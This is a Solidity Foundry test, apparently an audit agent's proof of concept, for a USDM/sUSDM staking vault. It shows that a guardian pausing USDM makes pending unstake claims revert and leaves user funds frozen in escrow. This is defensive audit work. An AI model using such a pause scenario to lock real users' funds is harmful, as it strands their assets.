// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/governance/MonetrixAccessController.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts, get sUSDM and escrow references
// 2. [T=0] User deposits USDC into vault to receive USDM, then stakes USDM into sUSDM
// 3. [T=1] User requests unstake via sUSDM.cooldownShares(), burning sUSDM and moving USDM to sUSDMEscrow
// 4. [T=cooldown+1] Cooldown expires, user is eligible to claim
// 5. [T=cooldown+2] Guardian pauses USDM contract (simulating emergency or malicious action)
// 6. [T=cooldown+3] User attempts to call sUSDM.claimUnstake(), which calls sUSDMEscrow.release()
// 7. [Assert] sUSDMEscrow.release() calls USDM.transfer(), which reverts due to whenNotPaused modifier on USDM._update(), freezing user funds indefinitely

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");

        address user = address(0xBEEF);
        console.log("Dealing 100 ether to user:", user);
        vm.deal(user, 100 ether);

        // Get protocol contracts
        console.log("Fetching vault.susdm()...");
        console.log("Vault address:", address(vault));
        sUSDM susdmToken = vault.susdm();
        console.log("susdmToken address:", address(susdmToken));

        console.log("Fetching susdmToken.escrow()...");
        sUSDMEscrow escrow = susdmToken.escrow();
        console.log("escrow address:", address(escrow));

        // 1. User deposits USDC to get USDM
        uint256 depositAmount = 10000e6;
        console.log("Calling _deposit for user with amount:", depositAmount);
        _deposit(user, depositAmount);
        console.log("_deposit completed successfully");

        // 2. User stakes USDM to get sUSDM
        uint256 usdmBal = usdm.balanceOf(user);
        console.log("User USDM balance after deposit:", usdmBal);

        vm.startPrank(user);
        console.log("Approving susdmToken to spend USDM...");
        usdm.approve(address(susdmToken), usdmBal);

        console.log("Depositing USDM into susdmToken...");
        uint256 shares = susdmToken.deposit(usdmBal, user);
        console.log("Received sUSDM shares:", shares);
        vm.stopPrank();

        // 3. User requests unstake (cooldown)
        console.log("Requesting unstake (cooldown) for shares:", shares);
        vm.prank(user);
        uint256 requestId = susdmToken.cooldownShares(shares);
        console.log("Cooldown request ID:", requestId);

        // 4. Warp past cooldown period
        uint256 cooldownPeriod = config.unstakeCooldown();
        console.log("Cooldown period from config:", cooldownPeriod);
        console.log("Block timestamp before warp:", block.timestamp);
        vm.warp(block.timestamp + cooldownPeriod + 1);
        console.log("Block timestamp after warp:", block.timestamp);

        // 5. Guardian pauses USDM
        // We grant GUARDIAN_ROLE to this test contract to simulate the guardian action
        address guardianActor = address(this);
        bytes32 GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
        console.log("Granting GUARDIAN_ROLE to:", guardianActor);
        console.log("Admin address:", admin);

        vm.prank(admin);
        acl.grantRole(GUARDIAN_ROLE, guardianActor);
        console.log("GUARDIAN_ROLE granted successfully");

        console.log("Pausing USDM contract...");
        usdm.pause();
        console.log("USDM contract paused");

        // 6. User attempts to claim unstake
        // This should revert because sUSDMEscrow.release() calls USDM.transfer()
        // and USDM._update() has a whenNotPaused modifier
        console.log("User attempting to claim unstake...");
        vm.prank(user);
        vm.expectRevert();
        susdmToken.claimUnstake(requestId);
        console.log("claimUnstake reverted as expected");

        // 7. Assert that user's USDM balance is still 0 (funds are frozen in escrow)
        uint256 userFinalBal = usdm.balanceOf(user);
        uint256 escrowFinalBal = usdm.balanceOf(address(escrow));

        console.log("User final USDM balance:", userFinalBal);
        console.log("Escrow final USDM balance:", escrowFinalBal);

        assertEq(userFinalBal, 0, "User funds are frozen in escrow due to USDM pause");
        assertGt(escrowFinalBal, 0, "USDM remains trapped in sUSDMEscrow");

        console.log("=== test_exploit finished successfully ===");
    }
}
